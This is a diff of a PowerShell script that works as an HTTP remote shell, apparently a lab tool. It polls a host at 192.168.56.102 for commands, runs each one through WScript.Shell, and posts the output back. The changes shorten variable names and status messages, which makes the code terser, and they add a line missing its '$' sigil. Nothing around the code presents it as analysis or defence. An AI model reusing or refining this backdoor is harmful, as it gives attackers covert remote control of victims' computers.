@@ -1,17 +1,12 @@
-$shell = New-Object -ComObject WScript.Shell
-$uri = "192.168.56.102"
+$s = New-Object -ComObject WScript.Shell
+$u = "192.168.56.102"
 $ProgressPreference = "SilentlyContinue"
-$trash = Invoke-WebRequest -Uri $uri -Method POST -Body "New Connection!"
-
+$r = Invoke-WebRequest -Uri $u -Method POST -Body "+"
 while ($TRUE){
-    $gResp = Invoke-WebRequest -Uri $uri -Method GET
-    if($gResp.Content -eq "/quit"){
-        Invoke-WebRequest -Uri $uri -Method POST -Body "Connection Closed!"
-        break
-    }
-    #$exec = $shell.Exec("cmd /C " + $gResp.Content)
-    $exec = $shell.Exec("PowerShell -C " + $gResp.Content)
-    $output = ($exec.StdOut.ReadAll() | Out-String)
-    $pResp = Invoke-WebRequest -Uri $uri -Method POST -Body $output
+    $r = Invoke-WebRequest -Uri $u -Method GET
+    if($r.Content -eq "/q"){r = Invoke-WebRequest -Uri $u -Method POST -Body "~";exit}
+    $e = $s.Exec("PowerShell -C " + $r.Content)
+    $o = ($e.StdOut.ReadAll() | Out-String)
+    $r = Invoke-WebRequest -Uri $u -Method POST -Body $o
 }
 
